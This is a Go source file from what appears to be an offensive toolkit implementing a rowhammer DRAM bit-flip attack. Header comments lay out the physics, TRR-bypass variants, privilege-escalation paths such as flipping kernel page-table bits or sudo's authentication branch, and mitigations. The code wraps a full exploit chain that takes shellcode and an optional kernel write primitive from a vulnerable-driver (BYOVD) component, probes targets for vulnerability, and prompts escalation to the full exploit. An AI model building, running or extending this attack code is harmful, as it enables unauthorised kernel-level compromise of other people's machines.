// Package rowhammer implements D-P8: Rowhammer DRAM Bit-Flip Attack.
//
// ───────────────────────────────────────────────────────────────────────────
// PHYSICS
// ───────────────────────────────────────────────────────────────────────────
//
// DRAM cells are capacitors. Each row is refreshed every 64ms by the memory
// controller. If a row is activated (read) many times before the adjacent
// row is refreshed, capacitive coupling bleeds charge between cells and
// can flip a bit in the adjacent row.
//
// The math:
//   - 64ms refresh interval
//   - DRAM row activation takes ~100ns (cache miss + row open + close)
//   - 64ms / 100ns = 640,000 possible activations per refresh window
//   - Rowhammer requires ~100,000-150,000 activations to flip a bit
//   - Therefore: ~6-7% of the refresh window → reliable bit flip
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK VARIANTS
// ───────────────────────────────────────────────────────────────────────────
//
//   Classic 2-sided:   hammer row N-1 and row N+1 → flip bits in row N
//   Many-sided:        hammer rows N-k through N-1 and N+1 through N+k
//                      bypasses DDR4 TRR (Target Row Refresh)
//   One-sided:         hammer a single row (less effective, works on some DRAM)
//   rowhammer.js:      no CLFLUSH needed — use cache eviction via huge arrays
//
// ───────────────────────────────────────────────────────────────────────────
// PRIVILEGE ESCALATION PATHS
// ───────────────────────────────────────────────────────────────────────────
//
//   1. PTE bit flip (most powerful):
//      - Flip bit 1 (R/W) in a kernel PTE → kernel page becomes writable
//      - Flip bit 2 (U/S) in a kernel PTE → kernel page user-accessible
//      - Flip bit 63 (NX) → code execution in data page
//      - Flip PFN bits → physical page aliasing (map kernel page into user space)
//
//   2. Setuid binary flip (historical):
//      - Flip bit in conditional jump (JZ→JNZ) in sudo/su binary
//      - Authentication check inverted → sudo works without password
//
//   3. Kernel data structure flip:
//      - Flip capability bit in task_struct.cap_effective
//      - Flip UID in process credentials
//      - Flip bucket pointer in kernel hash table
//
// ───────────────────────────────────────────────────────────────────────────
// DEFENSES AND MITIGATIONS
// ───────────────────────────────────────────────────────────────────────────
//
//   ECC memory:         corrects single-bit errors (detects double-bit)
//                       → rowhammer ineffective on ECC DRAM
//   DDR4 TRR:           refresh adjacent rows when hammer detected
//                       → bypassed by TRRespass (many-sided patterns)
//   pTRR / PARA:        probabilistic adjacent row activation
//   LPDDR4 PTRR:        on-DRAM protection (mobile devices)
//   Software mitigations: Google CFLARE, Intel MPX (all largely ineffective)
//   Kernel: KPTI:       prevents user space from seeing kernel PTEs
//                       → reduces PTE flip effectiveness (can't easily find PTE VA)
//
// ───────────────────────────────────────────────────────────────────────────
// NOTABLE EXPLOITS
// ───────────────────────────────────────────────────────────────────────────
//
//   CVE-2015-0565  Rowhammer via JavaScript (rowhammer.js) → NaCl escape
//   CVE-2016-6728  RAMpage (Android) — GPU DMA + rowhammer → root
//   Flip Feng Shui (2016) — VMs: flip bit in OpenSSH key or sudo binary
//   GLitch (2018)  — GPU cache eviction for rowhammer (no CLFLUSH)
//   TRRespass (2020) — DDR4 TRR bypass with many-sided patterns
//   BlackSmith (2021) — Non-uniform patterns defeat TRR completely
//   SMASH (2021)   — Rowhammer via network packet processing
//
package rowhammer

import (
	"fmt"
	"time"
)

// AttackConfig is the top-level configuration for a rowhammer attack.
type AttackConfig struct {
	// Shellcode to execute after privilege escalation.
	Shellcode []byte

	// KernelWriteFn allows using an existing ring-0 write primitive
	// (e.g., from the byovd package) to assist the rowhammer exploit.
	// If nil, the exploit relies entirely on DRAM bit flips.
	KernelWriteFn func(physAddr uint64, value uint64) error

	// MaxDuration is the total attack time limit (default: 10 minutes).
	MaxDuration time.Duration

	// UseTRRBypass enables multi-sided hammering for DDR4 with TRR.
	UseTRRBypass bool

	// Verbose enables detailed progress output.
	Verbose bool
}

// AttackResult summarizes the attack outcome.
type AttackResult struct {
	// BitFlipsFound is the total number of DRAM bit flips observed.
	BitFlipsFound int

	// UsefulFlipsFound is the number of exploitable PTE bit flips.
	UsefulFlipsFound int

	// PrivEscAchieved is true if privilege escalation succeeded.
	PrivEscAchieved bool

	// Stage is the last completed stage.
	Stage string

	// Duration is the total attack time.
	Duration time.Duration

	// DRAMVulnerable indicates whether the DRAM is vulnerable to rowhammer.
	DRAMVulnerable bool

	// ECC indicates whether ECC was detected (flips corrected).
	ECC bool
}

// Execute runs the full rowhammer attack chain.
func Execute(cfg *AttackConfig) (*AttackResult, error) {
	if cfg.MaxDuration == 0 {
		cfg.MaxDuration = 10 * time.Minute
	}

	exploitCfg := &ExploitConfig{
		Shellcode:      cfg.Shellcode,
		UseKernelWrite: cfg.KernelWriteFn != nil,
		KernelWriteFn:  cfg.KernelWriteFn,
		MaxHammerTime:  cfg.MaxDuration,
		UseTRRBypass:   cfg.UseTRRBypass,
		Verbose:        cfg.Verbose,
	}

	exploitRes, err := FullExploit(exploitCfg)

	res := &AttackResult{
		BitFlipsFound:    exploitRes.BitFlipsFound,
		UsefulFlipsFound: len(exploitRes.UsefulFlips),
		PrivEscAchieved:  exploitRes.PrivEscAchieved,
		Stage:            exploitRes.Stage,
		Duration:         exploitRes.Duration,
		DRAMVulnerable:   exploitRes.BitFlipsFound > 0,
	}

	return res, err
}

// Probe runs the hammering without exploiting — just checks if this
// machine's DRAM is vulnerable to rowhammer bit flips.
// Useful for red team assessment: "can we rowhammer this target?"
func Probe(timeout time.Duration) (*ProbeResult, error) {
	if timeout == 0 {
		timeout = 2 * time.Minute
	}

	start := time.Now()

	engine, err := NewHammerEngine(&HammerConfig{
		Pattern:        0xFF,
		Iterations:     HammerIterations,
		Rounds:         HammerRounds,
		UseManyHammer:  false,
		MaxFlipsWanted: 5,
		Timeout:        timeout,
	})
	if err != nil {
		return nil, fmt.Errorf("probe engine: %w", err)
	}
	defer engine.Close()

	flips, err := engine.FindFlips()
	duration := time.Since(start)

	res := &ProbeResult{
		Vulnerable:    len(flips) > 0,
		FlipsFound:    len(flips),
		Duration:      duration,
		DRAM:          classifyDRAM(flips),
		Recommendation: recommendation(flips),
	}

	if err != nil && len(flips) == 0 {
		return res, err
	}
	return res, nil
}

// ProbeResult is the result of a rowhammer probe.
type ProbeResult struct {
	Vulnerable     bool
	FlipsFound     int
	Duration       time.Duration
	DRAM           string // "DDR3", "DDR4-TRR", "DDR4-no-TRR", "ECC", "unknown"
	Recommendation string
}

func classifyDRAM(flips []*HammerResult) string {
	if len(flips) == 0 {
		return "ECC or TRR-protected DDR4 (or insufficient time)"
	}
	// Rough heuristic: DDR4 flips tend to be harder to find.
	if len(flips) > 50 {
		return "DDR3 (highly vulnerable)"
	}
	if len(flips) > 0 {
		return "DDR4 without effective TRR (vulnerable)"
	}
	return "unknown"
}

func recommendation(flips []*HammerResult) string {
	if len(flips) == 0 {
		return "DRAM appears resistant. Try: --use-trr-bypass (multi-sided patterns), longer timeout, or use kernel write primitive instead."
	}
	return fmt.Sprintf("DRAM is VULNERABLE. Found %d flips. Run full exploit chain.", len(flips))
}

// AssistedExploit uses an existing kernel write primitive to modify PTEs
// without relying on physical bit flips. This is the "rowhammer-assisted"
// path where we use rowhammer only to discover the physical layout, then
// use the BYOVD write primitive to do the actual PTE modification.
//
// This combines D-P7 (PCIe DMA) or BYOVD (ring-0 write) with D-P8's
// PTE manipulation knowledge.
func AssistedExploit(shellcode []byte, kernelWriteFn func(physAddr uint64, value uint64) error) (*AttackResult, error) {
	return Execute(&AttackConfig{
		Shellcode:     shellcode,
		KernelWriteFn: kernelWriteFn,
		MaxDuration:   3 * time.Minute,
		Verbose:       true,
	})
}
